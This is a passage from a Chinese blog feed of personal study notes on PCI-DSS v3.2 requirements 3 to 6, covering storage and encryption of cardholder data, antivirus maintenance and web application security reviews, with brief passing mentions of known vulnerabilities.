alt="6.6"><br>1、利用手动或自动应用程序漏洞安全评估工具或方法审核面向公众网络应用程序，至少每年一次并在有任何变更后进行<br>2、在面向公众的web应用程序前安装可检查和防范网页式攻击的自动化技术解决方案（例如web应用程序防火墙），泳衣不断检查所有流量<br>说一句，企业的src还是挺有必要的。对于面向公众的网络应用，就是对外提供服务的那些网络应用，我们要持续不断地解决新的威胁和漏洞。既然对外开放，就会面临不断地攻击，我们要通过一定的手段，确保他不受这些攻击的威胁。我们可以通过上面说的两个方法。<br>一个是定期手动或者自动对这个网络应用进行漏洞安全评估。我们需要定期执行，但是在某些情况发生导致系统环境产生变化我们也都进行检测评估，并在发现漏洞后及时修复，记录并重新评估。<br>二是在这个网络应用和外部网络之间增加加一个防止攻击的自动化解决方案，比如web防火墙，安全狗之类的。在使用之后我们也得确保我们的防火墙处于工作状态以及有详细的抵御攻击的日志。</p><h3 id="6-7-确保已记录、正在使用且所有相关方了解用于开发和维护安全系统和应用程序的安全政策和错做程序"><a href="#6-7-确保已记录、正在使用且所有相关方了解用于开发和维护安全系统和应用程序的安全政策和错做程序" class="headerlink" title="6.7 确保已记录、正在使用且所有相关方了解用于开发和维护安全系统和应用程序的安全政策和错做程序"></a>6.7 确保已记录、正在使用且所有相关方了解用于开发和维护安全系统和应用程序的安全政策和错做程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-24ed308b23819cae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.7"><br>确保我们开发并维护安全的系统和应用程序的措施被详细记录，并且相关人员以及学习并严格遵守。落实到每个人。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第三个区域维护漏洞管理计划也就结束了。回头看看，主要就是有实时更新的杀毒软件和开发并维护安全的系统和网络应用程序流程。这个区域主要就是对漏洞产生时候我们最快修补漏洞，最大化减少漏洞对我们产生的不利影响。我们虽然可以尽全力把防御体系做到最好，但是不可能杜绝漏洞的而产生，所有做好对漏洞的及时响应也是企业安全中的一个重要环节。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-六&quot;&gt;&lt;a href=&quot;#PCI-
      
    
    </summary>
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(五)</title>
    <link href="https://rliyuqing.github.io/2018/05/20/18.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/"/>
    <id>https://rliyuqing.github.io/2018/05/20/18. PCI-DSS(V3.2.1)学习笔记(五)/</id>
    <published>2018-05-20T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.794Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="PCI-DSS-V3-2-学习笔记-五"><a href="#PCI-DSS-V3-2-学习笔记-五" class="headerlink" title="PCI-DSS(V3.2)学习笔记(五)"></a>PCI-DSS(V3.2)学习笔记(五)</h1><hr><h1 id="三、维护漏洞管理计划"><a href="#三、维护漏洞管理计划" class="headerlink" title="三、维护漏洞管理计划"></a>三、维护漏洞管理计划</h1><p>维护漏洞管理计划，我们前面说了安全的网络和系统的基本建设的要求，以及保护我们的持卡人数据不被攻击者窃取等，现在要说的是如果我们做的都很好了，但是任会攻击者通过某种方法攻击我们，比如新型的病毒或者漏洞，之前看过一部电影《我是谁，没有绝对安全的系统》的确，所有系统都是人搭建的，没有绝对完美的人，也没有绝对安全的系统，我们不能做好了所有的保护措施，认为攻击者不可能窃取我们的信息了。我们搭建好了符合PCI DSS要求的保护措施，也要有应对攻击可能发生的计划，也就是说漏洞的管理计划。</p><h2 id="要求5：为所有系统提供恶意软件防护并定期更新杀毒软件或程序"><a href="#要求5：为所有系统提供恶意软件防护并定期更新杀毒软件或程序" class="headerlink" title="要求5：为所有系统提供恶意软件防护并定期更新杀毒软件或程序"></a>要求5：为所有系统提供恶意软件防护并定期更新杀毒软件或程序</h2><p>说道恶意软件我想绝对所有人都被不同程度的骚扰过。我很少使用这么偏激的程度副词，绝对，那是因为网络上的恶意软件已经铺天盖地，无孔不入。有一些只是一些骗取流量的广告，还有的甚至是通过恶意软件利用你的设备进行挖矿等，编程“肉鸡”。<br>有些针对特东漏洞的恶意软件进入我们网络后会利用系统漏洞，进行破坏，带来很大的威胁，所以对恶意软件的定期防护和杀毒软件的更新还是很有必要的！</p><h3 id="5-1-在经常受到恶意软件影响的所有系统（特别是个人电脑和服务器）中部署杀毒软件。"><a href="#5-1-在经常受到恶意软件影响的所有系统（特别是个人电脑和服务器）中部署杀毒软件。" class="headerlink" title="5.1 在经常受到恶意软件影响的所有系统（特别是个人电脑和服务器）中部署杀毒软件。"></a>5.1 在经常受到恶意软件影响的所有系统（特别是个人电脑和服务器）中部署杀毒软件。</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-85162301e7ae0f31.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.1"><br>对于可能会被恶意软件入侵的系统，特别是个人电脑，服务器。我们要部署特定的杀毒软件，当然这个杀毒软件的实时更新是很有必要的，因为很多都是利用0day漏洞进行攻击，杀毒软件的实时更新极为重要，必要时需要手工测试，分析。</p><h4 id="5-1-1-确保杀毒程序能检测、删除并阻止所有已知类型的恶意软件"><a href="#5-1-1-确保杀毒程序能检测、删除并阻止所有已知类型的恶意软件" class="headerlink" title="5.1.1 确保杀毒程序能检测、删除并阻止所有已知类型的恶意软件"></a>5.1.1 确保杀毒程序能检测、删除并阻止所有已知类型的恶意软件</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-97ae310ffbbe81dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.1.1"><br>这就是确保我们选取的杀毒软件的强大性，选择一款好的杀毒软件很重要，虽然这听着像是广告，但是功能上有盲点的杀毒软件就和有短板的水桶一样，其他东西在高，有一个短板，攻击者便可以轻松实施攻击手段。<br>所有我们要确保我们使用的杀毒软件能够阻止所有类型和形式的恶意软件。</p><h4 id="5-1-2-对于通常不收恶意软件影响的系统，需要执行定西评估已确定并评估不断进化的恶意软件的威胁，从而确认这些系统是否仍不需要使用杀毒软件。"><a href="#5-1-2-对于通常不收恶意软件影响的系统，需要执行定西评估已确定并评估不断进化的恶意软件的威胁，从而确认这些系统是否仍不需要使用杀毒软件。" class="headerlink" title="5.1.2 对于通常不收恶意软件影响的系统，需要执行定西评估已确定并评估不断进化的恶意软件的威胁，从而确认这些系统是否仍不需要使用杀毒软件。"></a>5.1.2 对于通常不收恶意软件影响的系统，需要执行定西评估已确定并评估不断进化的恶意软件的威胁，从而确认这些系统是否仍不需要使用杀毒软件。</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-0b769d6ccdc360bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.1.2"><br>我们前面对那些可能遭到恶意软件入侵的系统都安全了功能强大的杀毒软件，但是那些被我们规定为不可能遭到恶意软件的系统是否会一直是安全的呢。<br>在我们业务变动的时候可能系统的配置会发生改变，可能会由安全变得不安全，或者恶意软件的入侵能力因为某些条件便强，使得原本不受威胁的系统现在受威胁。<br>上面这两个条件的发生是极为可能的，所以我们要定期对这些不受威胁的系统进行评估，确保他们仍然不受威胁。这个定期可能是一个周期，但是当业务变动导致系统配置发生变化，和恶意软件的重要进化发生时也必须进行重新评估。</p><h3 id="5-2-确保所有杀毒软件按如下方式维护"><a href="#5-2-确保所有杀毒软件按如下方式维护" class="headerlink" title="5.2 确保所有杀毒软件按如下方式维护"></a>5.2 确保所有杀毒软件按如下方式维护</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-7579a16f2d956656.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.2"><br>1、保持为最新<br>2、执行定期扫描<br>3、生成检查日志（PCI DSS要求10.7规定保留）<br>三个维护要求，通过配置自动更新保持为最新，就是为了保证不会出现新的短板，导致服务器被恶意软件入侵；配置执行定期扫描，这个就不用说了，杀毒软件就得定期的扫描。生成检查日志呢，这个也很重要。我们可以通过日志查看到我们监控病毒或恶意软件的活动以及反恶意软件的效果。</p><h3 id="5-3-确保杀毒机制积极运行且无法被用户禁用或更改，除非管理人员根据具体情况作出有时间限制的明确授权"><a href="#5-3-确保杀毒机制积极运行且无法被用户禁用或更改，除非管理人员根据具体情况作出有时间限制的明确授权" class="headerlink" title="5.3 确保杀毒机制积极运行且无法被用户禁用或更改，除非管理人员根据具体情况作出有时间限制的明确授权"></a>5.3 确保杀毒机制积极运行且无法被用户禁用或更改，除非管理人员根据具体情况作出有时间限制的明确授权</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-394fe7f76e40e067.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.3"><br>我们在要求1中的最后也曾看到过类似的要求：对于一些便携式计算设备要加防火墙并使用户自己无法更改。这里也是类似的，但也有不同。<br>我们是针对所有可能被恶意软件入侵的系统，我们在安装了杀毒软件之后，要确保这些软件一直是处于运行，且非管理人员无法更改的状态。而且只有有合理的技术或业务需要时才能在获得管理人员的批准，并且进行了其他的安全保护措施之后才能可以暂时的一定时间的禁用杀毒软件。</p><h3 id="5-4-确保已记录、正在使用且所有相关方了解为系统提供恶意软件防护的安全政策和操作程序"><a href="#5-4-确保已记录、正在使用且所有相关方了解为系统提供恶意软件防护的安全政策和操作程序" class="headerlink" title="5.4 确保已记录、正在使用且所有相关方了解为系统提供恶意软件防护的安全政策和操作程序"></a>5.4 确保已记录、正在使用且所有相关方了解为系统提供恶意软件防护的安全政策和操作程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-2ef402f3ff7b10a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.4"><br>确保我们的提供恶意软件保护的这个机制有详细的文件记录，且相关人员已经进行了学习，并严格按照这个记录文件的标准进行执行。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于提供杀毒软件保护的策略我们也进行学习了，这个可能博主经历的也比较少，主要都是个人PC端的杀毒软件保护，没有正真体验过公司内部的情况，所以自己的看法也有些粗鄙。但是0day还是看过很多的。记得前不久有一个GhostScript沙箱绕过的漏洞，影响了最新版本的imagemaick，可以远程命令执行，当时很多大公司都出现了问题，包括新浪，百度贴吧，博主身边的朋友用这个POC也混了不少src的奖金。另外，就今天看到一个分享CVE-2018-3191的WebLogic的远程代码指定漏洞被灰产做成了批量攻击工具，又被捕获了一大批肉鸡。所以杀毒软件的更新是很重要的，因为我们无法避免0day的产生，所以要保证我们的响应速度最快，也得保证我们使用的杀毒软件的工具为最新的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-五&quot;&gt;&lt;a href=&quot;#PCI-
      
    
    </summary>
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(四)</title>
    <link href="https://rliyuqing.github.io/2018/05/14/17.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/"/>
    <id>https://rliyuqing.github.io/2018/05/14/17. PCI-DSS(V3.2.1)学习笔记(四)/</id>
    <published>2018-05-14T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.793Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="PCI-DSS-V3-2-学习笔记-四"><a href="#PCI-DSS-V3-2-学习笔记-四" class="headerlink" title="PCI-DSS(V3.2)学习笔记(四)"></a>PCI-DSS(V3.2)学习笔记(四)</h1><hr><h1 id="二、保护持卡人数据"><a href="#二、保护持卡人数据" class="headerlink" title="二、保护持卡人数据"></a>二、保护持卡人数据</h1><h2 id="要求4：加密持卡人数据在开放式公共网络中的传输"><a href="#要求4：加密持卡人数据在开放式公共网络中的传输" class="headerlink" title="要求4：加密持卡人数据在开放式公共网络中的传输"></a>要求4：加密持卡人数据在开放式公共网络中的传输</h2><p>要求3针对的是存储的持卡人数据的保护措施，要求4则是持卡人数据传输过程中的安全措施。<br>如何保护传输中的持卡人数据呢，在我看来主要有两个方向，一个是建立一个安全的传输信道，或者利用第三方安全的传输信道传输持卡人数据，另一个就是对持卡人数据进行强效加密，保证就算攻击者拿到持卡人数据也无法翻译成明文。<br>我们具体来看看要求4中说的都有哪些吧。</p><h3 id="4-1-使用强效加密法和安全协议来保护经由公开、公共网络传输的敏感持卡人数据。"><a href="#4-1-使用强效加密法和安全协议来保护经由公开、公共网络传输的敏感持卡人数据。" class="headerlink" title="4.1 使用强效加密法和安全协议来保护经由公开、公共网络传输的敏感持卡人数据。"></a>4.1 使用强效加密法和安全协议来保护经由公开、公共网络传输的敏感持卡人数据。</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-816f73268922fb45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.1-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-83bb7ab2738254b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.1-2"><br>包括：<br>1、只接受可信任的密钥和证书<br>2、使用的协议只支持安全的版本或配置<br>3、加密强度适合所有的加密方法<br>开放式网络就是不安全的网络，这里泛指互联网，GSM，GPRS等。<br>这里就是围绕安全的信道和持卡人数据的加密来说的。我们通过一系列的方法，例如安全的协议等来构造安全的通信通道，且确保我们的配置正确，安全以及所支持的版本没有问题。<br>我们也会通过提前测试通话传输，确保传输被强效加密。强效加密我们前面也说了很多次了，但是注意我们要选取最优的加密方式，并不是加密效果越强越好，我们必须根据具体业务需要进行选择，如果一个加解密耗费三四秒，在很多地方及其影响用户体验。<br>这里特别针对TLS来说了说，最近google chrome已经对所有未加密的网站都会在地址栏上明确标记为“Not Secure”（不安全）。也就是说，如果你的网站没有采用HTTPS协议，当使用谷歌新版浏览器的用户访问网站时就会出现不安全提示。<br>另一点我们使用https的时候也要注意SSL协议的版本的安全性，确保使用安全的SSL协议的版本，使用存在漏洞版本的SSL也是极不安全的。</p><h4 id="4-1-1-确保传输持卡人数据或连接到持卡人数据环境的无线网络使用行业最优方法，以及验证和传输实施强效加密"><a href="#4-1-1-确保传输持卡人数据或连接到持卡人数据环境的无线网络使用行业最优方法，以及验证和传输实施强效加密" class="headerlink" title="4.1.1 确保传输持卡人数据或连接到持卡人数据环境的无线网络使用行业最优方法，以及验证和传输实施强效加密"></a>4.1.1 确保传输持卡人数据或连接到持卡人数据环境的无线网络使用行业最优方法，以及验证和传输实施强效加密</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-72a507c6349bc050.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.1.1"><br>针对持卡人数据可能流通的网络来说，尤其是无线网络，我们确保在这个无线环境内使用了传输的验证和强效加密。<br>为什么这里要特别说一下持卡人数据环境所连接的无线网络呢，前面已经针对在开放式网络中的安全传输的要求了。很多时候我们只注意了外部不安全网络的防护，却忽略了内部的无线网络的安全，这也是我们需要注意的。如果攻击者混入内网，或者办公网，则任科员嗅探捕获我们的持卡人数据。</p><h3 id="4-2-不要使用终端用户通讯技术（例如，电子邮件、即使通讯、短信、聊天等）来传送不受保护的PAN"><a href="#4-2-不要使用终端用户通讯技术（例如，电子邮件、即使通讯、短信、聊天等）来传送不受保护的PAN" class="headerlink" title="4.2 不要使用终端用户通讯技术（例如，电子邮件、即使通讯、短信、聊天等）来传送不受保护的PAN"></a>4.2 不要使用终端用户通讯技术（例如，电子邮件、即使通讯、短信、聊天等）来传送不受保护的PAN</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-8d3c093e07bb9c9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.2"><br>结合前面的我们知道，我们必须确保在开放式网络中通过安全的信道传输未加密，未受保护的敏感数据，我们如果通过终端用户通讯技术，我们无法保证我们通讯没有被监听，捕获。<br>如果我们使用这些终端用户通讯技术，我们确保我们传输的敏感数据，比如PAN是强效加密的，以及密钥是提前安全共享的，或确保他不可读。</p><h3 id="4-3-确保已记录、正在使用且所有相关方了解用于加密持卡人数据传输的安全政策和操作程序"><a href="#4-3-确保已记录、正在使用且所有相关方了解用于加密持卡人数据传输的安全政策和操作程序" class="headerlink" title="4.3 确保已记录、正在使用且所有相关方了解用于加密持卡人数据传输的安全政策和操作程序"></a>4.3 确保已记录、正在使用且所有相关方了解用于加密持卡人数据传输的安全政策和操作程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-7bdc0fa98040fe6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.3"><br>和之前的要求一样，我们有这样的保护策略，就得有详细的文件记录，并确保我们所实施的和文件的统一，以及更新保护策略时即使更新文件。并且确保和此相关的所有工作人员都已经理解并学习了整个安全政策和操作流程。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第四点要求不是很多，但是总结来说我们就是要确保我们传输的敏感数据必须在安全的信道中传输（通过安全的服务或者协议比如https），如果不能确保信道的安全，则必须使用强效的加密措施。<br>具体的第二个区域（保护持卡人数据）的两个要点也就结束了。对已存储的持卡人数据进行保护，对传输中的持卡人数据进行保护，虽然只有两个重要的环节，但是需要做的工作有很多。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-四&quot;&gt;&lt;a href=&quot;#PCI-
      
    
    </summary>
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(三)</title>
    <link href="https://rliyuqing.github.io/2018/05/08/16.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)/"/>
    <id>https://rliyuqing.github.io/2018/05/08/16. PCI-DSS(V3.2.1)学习笔记(三)/</id>
    <published>2018-05-08T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.792Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="PCI-DSS-V3-2-学习笔记-三"><a href="#PCI-DSS-V3-2-学习笔记-三" class="headerlink" title="PCI-DSS(V3.2)学习笔记(三)"></a>PCI-DSS(V3.2)学习笔记(三)</h1><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> 下面开始学习第二个区域的要求，将会和前面两个不太一样。主要的内容是具体如何保护持卡人的数据，将会分为两个要求和多个小点：<br>3、保护存储的持卡人数据<br>4、加密持卡人数据在开放式网络中的传输<br>可以看到第二个区域讲的保护持卡人数据主要是从持卡人数据的存储和传输过程中去保护。第一个区域主要讲的则是为了保护持卡人数据而如何建立并维护这样一个安全的网络和系统。下面我们具体去看看。</p><h1 id="二、保护持卡人数据"><a href="#二、保护持卡人数据" class="headerlink" title="二、保护持卡人数据"></a>二、保护持卡人数据</h1><h2 id="要求3：保护存储的持卡人数据"><a href="#要求3：保护存储的持卡人数据" class="headerlink" title="要求3：保护存储的持卡人数据"></a>要求3：保护存储的持卡人数据</h2><p>这里主要针对的是已经存储的持卡人数据。对于这些数据我们可以通过加密或者hash的方法进行处理之后再存储。这里就涉及到很多真是的案例了，前几年爆出的很多大厂被脱裤，导致大量用户的信息或者账号密码泄露，更可怕的是很多的公司都是明文存储用户的密码。我们知道对于密码这样的个人隐私数据，应该是加密之后存储到数据库中，这样才能确保只有用户自己才知道这个密码。<br>还有很多其他措施，比如能不存储就不存储，因为每多一次存储就多一个可能被攻击的点。还有截词存储等。说起截词存储让我想起了大二做的一个项目，是一个密码记录的软件。当时因为很多原因碰到了密码负担导致的种种安全隐患，于是想做一款密码本的app，其中就用到了截词存储这样的想法。</p><h3 id="3-1-通过实施数据保留和处理政策、程序和流程最大限度地减少持卡人数据存储。"><a href="#3-1-通过实施数据保留和处理政策、程序和流程最大限度地减少持卡人数据存储。" class="headerlink" title="3.1 通过实施数据保留和处理政策、程序和流程最大限度地减少持卡人数据存储。"></a>3.1 通过实施数据保留和处理政策、程序和流程最大限度地减少持卡人数据存储。</h3><p>对所有持卡人数据（CHD）存储而言，这些政策、程序和流程至少包含以下方面：<br>1、将数据存储量和保存时间限制在法律、法规或业务要求内<br>2、持卡人数据的具体保留要求<br>3、不在需要时安全删除数据的流程<br>4、按季度查找并安全删除所存储的超过规定保留期限的持卡人数据的流程<br><img src="https://upload-images.jianshu.io/upload_images/6269327-a78f94620512bdd7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.1-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-93e7fe523358e229.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.1-2"><br>简而言之就是我们需要有一系列的流程来记录我们哪里存储了持卡人数据，存储了什么，存储多久。确保所有存储了这些数据的我们都有记录。其次就是定期按照记录的要求删除掉那些过期或者提前不被需要的持卡人数据，或者延长保存等。反正就是我们对于存储这些持卡人数据得有规定的处理和检查流程。然后就是上面也说到的能不存储就不存储！</p><h3 id="3-2-授权之后，不要存储敏感验证数据（即使已加密）。如果收到敏感验证数据，在完成授权流程之后使所有数据不可恢复。"><a href="#3-2-授权之后，不要存储敏感验证数据（即使已加密）。如果收到敏感验证数据，在完成授权流程之后使所有数据不可恢复。" class="headerlink" title="3.2 授权之后，不要存储敏感验证数据（即使已加密）。如果收到敏感验证数据，在完成授权流程之后使所有数据不可恢复。"></a>3.2 授权之后，不要存储敏感验证数据（即使已加密）。如果收到敏感验证数据，在完成授权流程之后使所有数据不可恢复。</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-8a73382cf10c50c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.2-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-33ae2c06bd2aa987.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.2-2"><br>对于敏感的验证数据，攻击者通过获取这个数据便可以利用这个验证数据进行身份的伪造等，比如伪造发行公司发行的用户卡。所以我们经过授权之后获得了敏感验证数据，就算加密了（因为很多时候攻击者不需要解密，比如重新提交进行）我们也不能存储这些数据。授权之后应立马删除这些验证数据，授权之前收到就在完成授权之后立马删除，不可恢复。<br>如果我们存在保存了敏感验证数据的系统设备，我们必须要核实这里的确是被业务或其他不可避原因所要求，我们也要有相应的记录，且保证有相关的符合PCI DSS策略的安全保护措施。<br>我们千万不可因为图便利就随意存储这些敏感验证数据！敏感衍生数据的唯一性才能保证我们发卡行的权威性，如果这个数据可以被窃取，攻击者便可以随意伪造。</p><h4 id="3-2-1-切勿在授权后存储卡片背面磁条上任何磁道的完整内容、芯片或其他地方那个上的等效数据。此类数据也可称未全磁道、磁道、磁道1、磁道2和磁条数据"><a href="#3-2-1-切勿在授权后存储卡片背面磁条上任何磁道的完整内容、芯片或其他地方那个上的等效数据。此类数据也可称未全磁道、磁道、磁道1、磁道2和磁条数据" class="headerlink" title="3.2.1 切勿在授权后存储卡片背面磁条上任何磁道的完整内容、芯片或其他地方那个上的等效数据。此类数据也可称未全磁道、磁道、磁道1、磁道2和磁条数据"></a>3.2.1 切勿在授权后存储卡片背面磁条上任何磁道的完整内容、芯片或其他地方那个上的等效数据。此类数据也可称未全磁道、磁道、磁道1、磁道2和磁条数据</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-8a393ecdd64e5238.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.2.1"><br>这里就是针对发行卡片的磁道数据来说的，我们不能存储磁道里面的完整内容，在业务需要的情况只能记录磁道数据中的某些内容，比如持卡人姓名，PAN等小部分数据。<br>如果我们记录了卡片所有的磁道数据，被攻击者获取之后，攻击着可以轻松的复制这张卡片进行伪造的欺骗性交易。</p><h4 id="3-2-3-授权后，请勿存储个人识别码（PIN）或经过加密的PIN数据块"><a href="#3-2-3-授权后，请勿存储个人识别码（PIN）或经过加密的PIN数据块" class="headerlink" title="3.2.3 授权后，请勿存储个人识别码（PIN）或经过加密的PIN数据块"></a>3.2.3 授权后，请勿存储个人识别码（PIN）或经过加密的PIN数据块</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-d7789beebb21fc85.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.2.3"><br>包括sim卡或者电脑都有PIN码，这是个人识别码，机密等级应该很高，只有我们自己和发卡行所知道，如果这个密码被人窃取也很容易被攻击。所以我们在授权之后不能存储任何关于PIN的信息。就像我们的银行卡密码被人知道了，再知道你的卡号就可以取走你的钱款。</p><h4 id="3-2-3-显示PAN时予以掩盖（最多显示前六位和后四位数字），以便仅限具有正当业务需要和工作人员查看除前六位和后四位以外的PAN"><a href="#3-2-3-显示PAN时予以掩盖（最多显示前六位和后四位数字），以便仅限具有正当业务需要和工作人员查看除前六位和后四位以外的PAN" class="headerlink" title="3.2.3 显示PAN时予以掩盖（最多显示前六位和后四位数字），以便仅限具有正当业务需要和工作人员查看除前六位和后四位以外的PAN"></a>3.2.3 显示PAN时予以掩盖（最多显示前六位和后四位数字），以便仅限具有正当业务需要和工作人员查看除前六位和后四位以外的PAN</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-363ddb952adab072.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.2.3"><br>这里通过截词的方式保护PAN码，这里根据PAN的长度等特性规定只显示前六位或者后四位，我们根据不同的数据可以更改要求。我们确保PAN的完整数据只有被明确授权的工作人员才可以查看，其他的默认显示的都是被截词之后的  PAN。</p><h3 id="3-4-通过采取下列任一方法使所有位置（包括便携式数字媒介上，备份媒介上和日志中）存储的PAN均不可读："><a href="#3-4-通过采取下列任一方法使所有位置（包括便携式数字媒介上，备份媒介上和日志中）存储的PAN均不可读：" class="headerlink" title="3.4 通过采取下列任一方法使所有位置（包括便携式数字媒介上，备份媒介上和日志中）存储的PAN均不可读："></a>3.4 通过采取下列任一方法使所有位置（包括便携式数字媒介上，备份媒介上和日志中）存储的PAN均不可读：</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-9729cea402836c98.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.4-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-a12e75f6a22caf7b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.4-2"><br>这里相当于上对上面的PAN截词方法的安全性强调了。除了截词这里也说了也可以用强效的加密方法，比如强效密码的hash等。但是如果我们的hash的算法比较简单，且可被攻击者获取，以及获取截词之后的 PAN，攻击者可以通过很多方法复原这个PAN。所以不仅仅是要在这个是PAN的显示或者存储上进行处理，我们还要对他的访问权限进行管理，比如默认不可读。还有就是对PAN的hash和截词版本不能有关联，防止被重建。</p><h4 id="3-4-1-如使用磁盘加密（而不是文件级或列级数据库加密），则逻辑访问必须得到单独管理并独立于本地操作系统的验证和访问控制机制-（例如，不使用本地用户账户数据库或通用网络登录凭证）。解密密钥决不能与用户账户关联。"><a href="#3-4-1-如使用磁盘加密（而不是文件级或列级数据库加密），则逻辑访问必须得到单独管理并独立于本地操作系统的验证和访问控制机制-（例如，不使用本地用户账户数据库或通用网络登录凭证）。解密密钥决不能与用户账户关联。" class="headerlink" title="3.4.1 如使用磁盘加密（而不是文件级或列级数据库加密），则逻辑访问必须得到单独管理并独立于本地操作系统的验证和访问控制机制 （例如，不使用本地用户账户数据库或通用网络登录凭证）。解密密钥决不能与用户账户关联。"></a>3.4.1 如使用磁盘加密（而不是文件级或列级数据库加密），则逻辑访问必须得到单独管理并独立于本地操作系统的验证和访问控制机制 （例如，不使用本地用户账户数据库或通用网络登录凭证）。解密密钥决不能与用户账户关联。</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-4be199ce86fe4154.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.4.1"><br>这里的意思就是说，对于磁盘加密使用的验证机制不能和他所在的操作系统的验证机制一样。举个例子，比如我们对这个磁盘进行了加密，密钥的凭证就是服务器用户的凭证，这样就是违反了这条标准的。我们要确保磁盘加密的验证机制是独立于操作系统以及操作系统内部这些服务的验证机制之外的。<br>这个一般应用于可移动设备，防止硬件丢失被窃取数据信息。</p><h3 